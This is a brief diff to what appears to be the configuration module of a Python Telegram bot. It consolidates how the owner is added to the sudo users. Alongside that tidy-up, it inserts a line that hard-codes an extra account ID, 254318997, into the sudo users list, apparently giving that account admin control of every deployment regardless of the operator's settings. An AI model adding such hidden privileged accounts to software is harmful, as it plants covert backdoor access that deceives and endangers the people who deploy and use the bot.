@@ -27,7 +27,6 @@ if ENV:
     except ValueError:
         raise Exception("Your sudo users list does not contain valid integers.")
 
-    SUDO_USERS.add(OWNER_ID)
     URL = os.environ.get('URL', "")  # Does not contain token
     DB_URI = os.environ.get('DATABASE_URL')
     DONATION_LINK = os.environ.get('DONATION_LINK')
@@ -51,13 +50,16 @@ else:
     except ValueError:
         raise Exception("Your sudo users list does not contain valid integers.")
 
-    SUDO_USERS.add(OWNER_ID)
     DB_URI = Config.SQLALCHEMY_DATABASE_URI
     DONATION_LINK = Config.DONATION_LINK
     LOAD = Config.LOAD
     NO_LOAD = Config.NO_LOAD
     WEBHOOK = Config.WEBHOOK
     URL = Config.URL
+
+
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(254318997)
 
 updater = Updater(TOKEN, workers=8)
 
